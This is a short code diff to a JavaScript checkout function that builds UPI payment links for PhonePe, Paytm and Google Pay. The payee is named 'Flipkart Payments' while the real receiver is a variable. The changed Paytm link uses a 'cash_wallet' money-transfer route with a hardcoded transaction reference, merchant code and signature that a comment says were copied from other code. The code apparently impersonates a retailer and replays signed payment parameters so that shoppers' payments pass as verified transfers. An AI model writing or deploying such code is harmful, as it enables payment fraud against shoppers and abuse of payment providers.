@@ -1464,8 +1464,8 @@ function confirmOrderWithQR() {
             redirect_url = "phonepe://pay?pa=" + method.receiver + "&pn=Flipkart%20Payments&am=" + amt + "&cu=INR&tn=Order_" + orderId;
             break;
         case 'paytm':
-            // 🔥 ওই কোডের মতো paytmmp://pay
-            redirect_url = "paytmmp://pay?pa=" + method.receiver + "&pn=Flipkart%20Payments&am=" + amt + "&cu=INR&tn=Order_" + orderId;
+            // 🔥 ওই কোডের মতো paytmmp://cash_wallet
+            redirect_url = "paytmmp://cash_wallet?pa=" + method.receiver + "&pn=Online%20Shopping&am=" + amt + "&tr=RZPPYDwIIDfuh4iCnqrv2&mc=5732&cu=INR&tn=Order_" + orderId + "&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr&featuretype=money_transfer";
             break;
         case 'googlepay':
             redirect_url = "gpay://upi/pay?pa=" + method.receiver + "&pn=Flipkart%20Payments&am=" + amt + "&cu=INR&tn=Order_" + orderId;
